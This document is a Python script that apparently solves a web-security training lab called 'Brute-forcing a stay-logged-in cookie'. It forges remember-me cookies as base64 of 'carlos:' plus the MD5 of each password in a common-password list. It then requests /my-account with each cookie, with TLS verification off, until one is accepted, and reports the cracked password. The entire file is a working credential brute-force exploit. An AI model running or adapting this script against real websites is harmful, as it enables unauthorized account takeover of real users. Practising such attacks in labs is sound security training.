import requests
import time
import hashlib
import base64
from colorama import Fore

LAB_NAME = "Brute-forcing a stay-logged-in cookie"
SCRIPT_START_TIME = time.time()


def run(url, payload=None, proxies=None):
    url = url.rstrip("/")
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Read password list\n2. Hash every the password\n3. Encrypt every tha hash with the username in the cookie\n4. Fetch carlos profile with every encrypted cookie\n""")

    usernames_list = [
        "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator",
        "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso",
        "access", "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion",
        "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af",
        "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al",
        "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an",
        "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
        "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight",
        "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", "atlanta",
        "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"
    ]

    password_list = [
        "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop",
        "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000",
        "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
        "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert",
        "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle",
        "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie",
        "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",
        "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor",
        "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
    ]

    print("[1] Reading password list.. ", end="", flush=True)

    print(Fore.WHITE + "[2] Brute forcing carlos password..")

    for counter, password in enumerate(password_list):
        hashed = hashlib.md5(password.encode()).hexdigest()
        cookie_value = f"carlos:{hashed}"
        cookie_encoded = base64.b64encode(cookie_value.encode()).decode()
        cookies = {"stay-logged-in": cookie_encoded}

        try:
            res = requests.get(f"{url}/my-account", cookies=cookies, proxies=proxies or {}, verify=False, allow_redirects=False)
        except Exception as e:
            print(Fore.RED + f"\n[!] Failed to GET /my-account: {e}")
            return False

        if res.status_code == 200:
            print(Fore.GREEN + f"\n🗹 Valid password found: {Fore.YELLOW}{password}")
            print_finish_message()
            return True
        else:
            print_progress(counter, len(password_list), password)

    print(Fore.RED + "[!] No valid password found")
    return False


def print_progress(counter, total, password):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"⧖ Elapsed: {elapsed}s || Trying ({counter+1}/{total}): " +
          Fore.BLUE + f"{password:50}", end="\r", flush=True)


def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"\n🗹 Finished in {elapsed} seconds")